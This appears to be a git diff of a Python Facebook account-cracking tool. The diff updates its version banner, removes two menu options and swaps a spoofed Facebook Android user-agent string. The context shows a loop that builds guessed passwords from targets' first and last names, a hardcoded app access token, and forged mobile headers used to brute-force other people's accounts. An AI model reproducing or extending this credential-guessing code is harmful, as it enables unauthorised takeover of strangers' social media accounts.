@@ -25,7 +25,7 @@ logo = """
 8888888P"       8888888P"       888     888 
 888             888 T88b        888     888 
 888             888  T88b       Y88b. .d88P 
-888             888   T88b       "Y88888P"  V.3
+888             888   T88b       "Y88888P"  V.4
 ----------------------------------------------
  Owner      :  CHRISE-XD
  Github     :  MR-CHRISE
@@ -57,8 +57,6 @@ def menu():
             menu()
         clear()
         print('[1] METHOD 1')
-        print('[2] METHOD 2')
-        print('[3] METHOD 3')
         linex()
         mthd=input('CHOOSE : ')
         linex()
@@ -115,7 +113,7 @@ def ffb(ids,names,passlist):
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                         accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/60.0.0.20.234;FBBV/244826963;FBDM/{density=2.1,width=952,height=1210};FBLC/en_GB;FBCR/MTN;FBMF/Techno;FBBD/Techno;FBPN/comfacebook.orca;FBDV/Techno Pova;FBSV/8;FBOP/5;FBCA/arm64-v8a]"
+                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/247.0.0.42.116;FBBV/182642072;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/184895505;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM--A045F;FBSV/13;FBOP/19;FBCA/arm64-v8a:;]"
                         head = {'User-Agent': ua,
                                 'Accept-Encoding': 'gzip, deflate',
                                 'Connection': 'Keep-Alive',
